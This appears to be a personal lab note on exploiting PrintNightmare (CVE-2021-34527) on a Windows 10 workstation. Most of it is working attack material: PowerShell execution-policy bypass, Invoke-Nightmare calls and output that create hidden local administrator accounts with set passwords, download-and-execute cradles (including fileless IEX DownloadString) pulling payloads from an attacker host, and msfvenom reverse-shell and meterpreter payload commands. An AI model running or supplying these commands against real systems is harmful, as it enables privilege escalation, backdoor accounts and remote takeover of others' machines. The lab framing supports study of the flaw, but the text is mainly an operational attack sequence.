---
created_date: 04 October 2023
updated_date: 04 October 2023
type: windows
url: https://github.com/JohnHammond/CVE-2021-34527              https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-34527
---
##### Machine Information
```
Gobots (Attacker)
===============

192.168.146.134 (HORDE Workstation)
===============
Artifacts Created:
User: adm1n
C:\Users\swindrunner\AppData\Local\Temp\nightmare.dll

Artifacts Deleted:
C:\Users\swindrunner\AppData\Local\Temp\nightmare.dll
```
### High-Level Summary

cve-2021-1675 PrintNightmare abuses the `spoolsv` service on windows by exploiting the registry key `HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows NT\Printers\PointAndPrint` with the parameters below

- HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows NT\Printers\PointAndPrint
- NoWarningNoElevationOnInstall = 0 (DWORD) or not defined (default setting)
- UpdatePromptSettings = 0 (DWORD) or not defined (default setting)

-------------
##### Lessons Learned
-  Was able to add the registry key to the Horde Workstation
-  Had to ensure that Windows defender allowed access to the registry key.
--------
###### spoolsv

- run a `ps` and check if spoolsv is running, if so probably vulnerable to `PrintNightmare` as long as registry key above exists and is set to `1` 
- Tested in my environment on a Windows 10 Machine


-----
###### Invoke-Module

```powershell
PS C:\Users\swindrunner\Desktop\malware> powershell -ep bypass
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

Try the new cross-platform PowerShell https://aka.ms/pscore6

PS C:\Users\swindrunner\Desktop\malware> import-module .\CVE-2021-34527.ps1
```

----
###### Invoke-Nightmare
```powershell
PS C:\Users\swindrunner\Desktop\malware> Invoke-Nightmare
[+] using default new user: adm1n
[+] using default new password: P@ssw0rd
[+] created payload at C:\Users\swindrunner\AppData\Local\Temp\nightmare.dll
[+] using pDriverPath = "C:\Windows\System32\DriverStore\FileRepository\ntprint.inf_amd64_24c579062c56db47\Amd64\mxdwdrv.dll"
[+] added user  as local administrator
[+] deleting payload from C:\Users\swindrunner\AppData\Local\Temp\nightmare.dll
PS C:\Users\swindrunner\Desktop\malware> net users

User accounts for \\HORDE

-------------------------------------------------------------------------------
adm1n                    Administrator            DefaultAccount
Guest                    Sylvanas Windrunner      WDAGUtilityAccount
The command completed successfully.

PS C:\Users\swindrunner\Desktop\malware> runas /user:adm1n powershell.exe
Enter the password for adm1n:
Attempting to start powershell.exe as user "HORDE\adm1n" ...
```
If you have fully interactive Powershell session.

`**Download file**   powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://192.168.146.129/http_x64.exe', 'exploit.exe')

`**Download and execute without saving on disk**   powershell.exe IEX (New-Object System.Net.WebClient).DownloadString('http://192.168.1.2/test.ps1')`

This worked
PS C:\Users\swindrunner\Desktop\malware> powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://192.168.146.129:8000/http_x64.exe', 'exploit.exe')
- have CB beacon
-----

msfvenom -p windows/shell/reverse_tcp LHOST=192.168.146.129 LPORT=5555 -f exe > prompt.exe
msfvenom -p windows/x64/shell/reverse_tcp  LHOST=192.168.146.129 LPORT=5555 -f exe > prompt.exe

msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.146.129 LPORT=2222 -f exe > prompt.exe
powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://192.168.146.129:8080/prompt.exe', 'revshell.exe')


PS C:\Users\swindrunner\Desktop\malware> powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://192.168.146.129:8000/CVE-2021-34527.ps1', 'CVE-2021-34527.ps1')


Import-Module .\CVE-2021-34527.ps1
Invoke-Nightmare -NewUser "jorden" -NewPassword "Password1" -DriverName "PrintMe"

Invoke-Nightmare -DriverName "Xerox" -NewUser "john" -NewPassword "SuperSecure"




